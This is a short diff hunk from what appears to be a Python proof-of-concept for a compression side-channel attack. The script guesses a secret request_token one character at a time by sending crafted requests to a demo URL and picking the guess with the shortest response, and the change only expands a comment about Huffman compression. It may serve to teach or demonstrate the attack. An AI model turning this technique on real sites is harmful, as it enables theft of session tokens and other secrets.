@@ -44,7 +44,7 @@ for j in range(longitud):
     url="http://malbot.net/poc/?request_token='"
     menor=100000
     flag = True
-    # We will check every character in the dictionary, until we find the one that suits the secret, which will be the one with the lowest response length, in case of a collision we will swap the payload with the character that we will be trying.
+    # We will check every character in the dictionary, until we find the one that suits the secret, which will be the one with the lowest response length, in case of a collision, because of the Huffing compression, we will swap the payload with the character that we will be trying.
     while flag:
         caracter = chr(caracteres[i])
         req=enviarPeticion(url, req , secreto, caracter + breaks  + "'")
